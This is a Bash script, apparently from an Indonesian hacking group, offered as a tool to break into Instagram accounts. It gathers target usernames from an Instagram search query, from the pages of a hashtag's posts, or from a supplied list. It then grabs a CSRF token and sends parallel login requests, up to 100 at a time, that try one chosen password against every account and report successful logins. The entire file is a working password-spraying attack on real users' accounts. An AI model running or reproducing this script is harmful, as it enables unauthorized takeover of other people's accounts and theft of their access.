#!/bin/bash
#Linux-Database


#color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

#thread limit
limit=100

#banner
clear
echo  "Hallo nyet :v"
sleep 1
echo  "Welcome"
sleep 1
echo  "sebelum itu gua akan berpantun dulu :v"
sleep 1
echo  "ekhm"
sleep 5
echo  "cie, nungguin ya"
sleep 2
echo  "Gajadi pantun nya :v"
sleep 2
echo  "selamat menggunakan!"
sleep 2
clear

echo   "
  ____________
  ║▒▒▒▒▒▒▒▒▒▒║
  ║▒▒▒▒▒▒▒▒▒▒║   Hack IG By Kelelawar 
  ║▒▒▒▒▒▒▒▒▒▒║       Cyber Team
  ║▒▒▒▒▒▒▒▒▒▒║
  ║▒▒▒▒▒▒▒▒▒▒║   
  ║▒▒▒▒▒▒▒▒▒▒║
  ║██████████╚╗
  ║██╔══╗█╔═╗█║
  ║██║╬╔╝█╚╗║█║
  ║██╚═╝█║█╚╝█║
  ╚╗█████████═╝
    ╚╗║╠╩╩╩╩╩╝
      ║║┈┈┈█▐█████▒.｡oO
      ║██╠╦╦╦╗
      ╚╗██████
        ╚════╝" | lolcat


#dependencies
dependencies=( "jq" "curl" )
for i in "${dependencies[@]}"
do
    command -v $i >/dev/null 2>&1 || {
        echo >&2 "$i : not installed - install by typing the command : apt install $i -y"
        exit
    }
done

#menu
echo -e '''
╔══════════════════════•ೋೋ•══════════════════════╗
   
   1] Dapatkan target dari  \e[1;31m@username\e[1;37m
   2] Dapatkan target dari  \e[1;31m#hashtag\e[1;37m
   3] Crack dari daftar target anda
   4] \e[1;31mExit\e[1;37m
   
╚══════════════════════•ೋೋ•══════════════════════╝
'''

read -p $'Choose  : \e[1;33m' opt

touch target

case $opt in
    1) #menu 1
        read -p $'\e[37m[\e[34m?\e[37m] Search by query   : \e[1;33m' ask
        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
        echo $'\e[37m[\e[34m+\e[37m] Just found        : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
        read -p $'[\e[1;34m?\e[1;37m] Password to use   : \e[1;33m' pass
        echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
        ;;
    2) #menu 2
        read -p $'\e[37m[\e[34m?\e[37m] Tags for use      : \e[1;33m' hashtag
        get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
        if [[ $get =~ "Page Not Found" ]]; then
        echo -e "$hashtag : ${red}Hashtag not found${white}"
        exit
        else
            echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
            echo -e "${white}[${blue}!${white}] Removing duplicate user from tag ${red}#$hashtag${white}"$(sort -u result > hashtag)
            echo -e "[${blue}+${white}] Just found        : ${yellow}"$(< hashtag wc -l ; echo -e "${white}user")
            read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
            echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
            for tag in $(cat hashtag); do
                echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
            done
            wait
            rm hashtag result
        fi
        ;;
    3) #menu 3
        read -p $'\e[37m[\e[34m?\e[37m] Input your list   : \e[1;33m' list
        if [[ ! -e $list ]]; then
            echo -e "${red}file not found${white}"
            exit
            else
                cat $list > target
                echo -e "[${blue}+${white}] Total your list   : ${yellow}"$(< target wc -l)
                read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
                echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
        fi
        ;;
    4) #menu 4
    echo "Bye Jing :v" | lolcat
    exit
    ;;
    *) #wrong menu
        echo -e "${white}options are not on the menu"
        sleep 1
        clear
        bash brute.sh
esac

#start_brute
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                    -H "cookie: csrftoken=${token}" \
                    -H "origin: https://www.instagram.com" \
                    -H "referer: https://www.instagram.com/accounts/login/" \
                    -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
                    -H "x-csrftoken: ${token}" \
                    -H "x-requested-with: XMLHttpRequest" \
                    -d "username=${i}&password=${pass}")
                    login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                    if [[ $login =~ "true" ]]; then
                            echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
                        elif [[ $login =~ "false" ]]; then
                                    echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
                            elif [[ $url =~ "checkpoint_required" ]]; then
                                    echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
                    fi
}

#thread
(
    for i in $(cat target); do
        ((thread=thread%limit)); ((thread++==0)) && wait
        brute "$i" &
    done
    wait
)

rm target